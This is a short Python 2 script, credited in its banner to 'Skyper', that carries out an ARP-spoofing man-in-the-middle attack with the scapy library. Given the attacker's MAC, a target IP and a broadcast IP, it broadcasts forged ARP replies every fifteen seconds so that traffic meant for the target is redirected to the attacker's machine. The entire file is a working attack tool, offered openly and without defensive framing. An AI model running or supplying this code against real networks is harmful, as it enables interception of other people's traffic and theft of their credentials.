#!/usr/bin/env python

from scapy.all import *
import time, sys

try:
	print "#################################################"
	print "##    Man In The Middle with Scapy by Skyper   ##"
	print "##           http://blog.skyplabs.net          ##"
	print "#################################################"
	
	MyMAC = sys.argv[1]
	targetIP = sys.argv[2]
	broadcastIP = sys.argv[3]
except:
	print "Usage: " + sys.argv[0] + " <Your MAC> <Target's IP> <Broadcast IP>"
	sys.exit(1)

def mitm(MyMAC, targetIP, broadcastIP, interval=15):
	"""Man In The Middle attack"""
	try:
		while 1:
			sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=targetIP, pdst=broadcastIP, hwsrc=MyMAC))
			time.sleep(interval)
	except KeyboardInterrupt:
		pass
		print ""
		print "[*] Stopping attack"


print "[*] Starting attack ..."
mitm(MyMAC, targetIP, broadcastIP)
